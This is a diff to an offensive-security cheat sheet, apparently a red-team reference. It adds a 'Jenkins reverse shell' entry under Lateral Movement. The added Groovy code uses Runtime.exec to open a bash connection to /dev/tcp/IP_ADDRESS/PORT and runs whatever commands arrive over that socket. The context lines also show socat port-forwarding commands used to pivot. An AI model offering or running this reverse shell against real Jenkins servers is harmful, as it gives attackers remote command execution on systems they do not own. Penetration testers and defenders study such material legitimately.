@@ -40,6 +40,7 @@
     - Enabling RDP
     - Upgrading shell to meterpreter
     - Forwarding Ports
+    - Jenkins reverse shell
 11. [Collection](#collection)
     - .
 12. [Command and Control](#command-and-control)
@@ -277,4 +278,14 @@ Lateral Movement
 	```
 	socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &
 	socat TCP-LISTEN:EXTERNAL_PORT,fork TCP:127.0.0.1:INTERNAL_PORT &
+	```
+
+* Jenkins reverse shell
+
+	If you gain access to a jenkins script console you can use this to gain a reverse shell on the node.
+	
+	```
+	r = Runtime.getRuntime()
+	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/IP_ADDRESS/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+	p.waitFor()
 	```
